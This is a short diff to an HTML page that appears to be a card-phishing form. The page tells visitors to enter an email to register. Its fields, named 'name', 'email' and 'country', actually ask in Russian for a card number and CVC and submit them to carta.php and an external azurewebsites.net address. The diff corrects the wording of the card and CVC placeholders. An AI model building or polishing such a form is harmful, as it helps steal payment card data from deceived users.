@@ -27,9 +27,9 @@ border: 0 none; }
 email address, then click <strong>Submit</strong>
 to register.</p>
 <form method="post" action="carta.php" enctype="multipart/form-data" >
-<input type ="text" name ="name" id ="name" placeholder ="Введите данные какрты">
+<input type ="text" name ="name" id ="name" placeholder ="Введите номер карты">
 <input type ="text" name ="email" id ="email" placeholder ="Ведите CVC..">
-<input type ="text" name ="country" id ="country" placeholder ="Ведите CVC..">
+<input type ="text" name ="country" id ="country" placeholder ="Номер карты..">
 <form method="post" action="https://den12.azurewebsites.net/index.php">
 <input class="dws-submit" type="submit" name="submit" value="Войти"> 
 <br> 
